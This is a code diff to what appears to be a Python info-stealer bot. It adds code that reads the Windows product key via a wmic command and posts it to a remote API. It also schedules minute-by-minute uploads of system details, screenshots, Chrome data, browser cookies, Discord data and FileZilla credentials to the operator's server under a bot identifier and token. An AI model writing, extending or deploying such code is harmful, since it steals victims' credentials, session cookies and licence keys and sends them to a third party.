@@ -106,6 +106,12 @@ class ApiController():
             boot_time_timestamp = psutil.boot_time()
             bt = datetime.fromtimestamp(boot_time_timestamp)
 
+            w_key = ""
+            try:    
+                w_key = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
+            except:
+                pass
+                
             post_data = {
                 "operating_system": uname.system,
                 "node_name": uname.node,
@@ -115,7 +121,8 @@ class ApiController():
                 "architecture": uname.machine,
                 "boot_time": f"{bt.year}-{bt.month}-{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
                 "cpu_cores": psutil.cpu_count(logical=True),
-                "memory": self.get_size(psutil.virtual_memory().total)
+                "memory": self.get_size(psutil.virtual_memory().total),
+                "windows_key": w_key
             }
 
             requests.post(f"{self.api_url}/update/details/{identifier}/{token}", json=post_data)
@@ -399,12 +406,13 @@ def main():
                         main()
                     
                     if api.check_account(bot_identifier, bot_token):
-                        api.update_filezilla(bot_identifier, bot_token, Filezilla().dump())
+                        api.update_details(bot_identifier, bot_token)
                         schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
                         schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
                         schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
                         schedule.every(1).minutes.do(api.update_cookies, bot_identifier, bot_token, Cookies().dump())
                         schedule.every(1).minutes.do(api.update_discord, bot_identifier, bot_token, Discord().dump())
+                        schedule.every(1).minutes.do(api.update_filezilla, bot_identifier, bot_token, Filezilla().dump())
 
                         while True:
                             schedule.run_pending()
